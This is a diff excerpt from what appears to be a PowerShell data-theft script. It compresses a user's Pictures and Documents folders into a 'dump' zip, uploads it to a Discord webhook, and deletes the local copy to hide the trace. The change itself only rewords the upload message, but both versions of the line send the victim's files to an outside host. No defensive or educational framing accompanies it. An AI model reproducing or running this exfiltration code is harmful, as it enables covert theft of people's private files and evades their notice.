@@ -36,8 +36,8 @@ $zipFileName = "dump-$username.zip"
 $filePath = Compress-Files -sp "\Pictures" -ibdsp $True -dp "\Documents" -ibddp $True -fn $zipFileName;
 
 # send discord message and files
-& Upload-Discord -t "$username dump uploading.." -f $filePath -u $webhookUrl
- 
+& Upload-Discord -t "User Pictures - $username" -f $filePath -u $webhookUrl
+
 # delete the compressed file from the computer
 Remove-FileOrFolder -ip $filePath -it "File" 
 
